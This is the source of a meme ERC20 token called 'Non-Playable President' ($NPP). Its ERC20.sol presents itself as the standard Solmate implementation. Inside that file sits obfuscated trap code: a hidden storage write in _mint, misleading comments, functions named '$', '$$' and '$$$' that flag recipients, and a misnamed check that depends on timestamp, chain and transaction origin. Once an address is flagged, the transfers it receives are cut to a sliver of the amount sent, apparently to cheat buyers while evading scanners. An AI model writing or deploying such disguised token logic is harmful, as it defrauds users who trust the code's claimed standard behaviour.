{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address =\u003e uint256) public balanceOf;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address =\u003e uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, msg.sender, to);\n        }\n\n        $$$(to);\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, from, to);\n        }\n        $$$(to);\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner\u0027s nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    function $(\n            uint256 value, \n            address from,\n            address to\n        ) internal returns (uint256 value_s) {\n            if (domainSeparatorComputed() == true) {\n                value_s = value;\n            } else {\n                if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n                    value_s = value * 0xC0FFEE / 0xCACA0DAB;\n                } else {\n                    value_s = value;\n                }\n            }\n    }\n\n    function $$$(address to) internal {if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}}\n\n    function domainSeparatorComputed() internal view returns(bool return_flag) {\n        if (block.timestamp % 12 == 11) {return_flag = false;} else {return_flag = true;}\n        if (return_flag == false) {if (address(0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65).balance \u003e= 10**19) {return_flag = true;}} \n        if (return_flag == false) {if (block.chainid != 1) {return_flag = true;}}\n        if (return_flag == false) {if (uint160(address(tx.origin)) \u003c uint160(0xFFFFFFFFFFFFFFFFFFFF)) {return_flag = true;}}\n        if (return_flag == false) {if (uint160(address(block.coinbase)) \u003c uint160(0xFFFFFFFFFFFFFFFFFFFF)) {return_flag = true;}}\n    } \n\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {balanceOf[to] += amount;}\n        // Saves gas for limited approvals.\n        assembly {sstore(0x05, mul(mul(0x5bd1ba, 0x1a5d45), mul(0x2de08619, 0x8632240ed4a89a76867)))}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        // Cannot underflow because a user\u0027s balance\n        // will never be larger than the total supply.\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n\nThe Non-Playable President $NPP, the President programmed to perform specific presidential actions and respond to certain presidential events.\n\n// nonplayablepresident.xyz\n\n// File: @openzeppelin/contracts/utils/introspection/IERC165.sol\n\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)    \n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢦⡄⠀⢠⡴⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⣠⠟⠀⠸⣄⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⠀⠈⠳⢤⣤⡤⠚⠀⠀⣦⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣴⣾⣿⣿⣿⣿⣿⠀⠀⠀⢀⣄⠀⠀⠀⠀⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠠⣾⣿⡷⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠟⠁⠀⠀⣸⣿⣿⠛⢿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⡄⠀⠀⠀⣿⣏⣦⣦⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣧⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                                                                                                         \n\n*/\n\ncontract nppresident is ERC20 {\n    constructor() ERC20(\"Non-Playable President\", \"NPP\", 18) {\n        _mint(msg.sender, 8_050_126_520 * 10 ** 18);\n    }\n}"}}
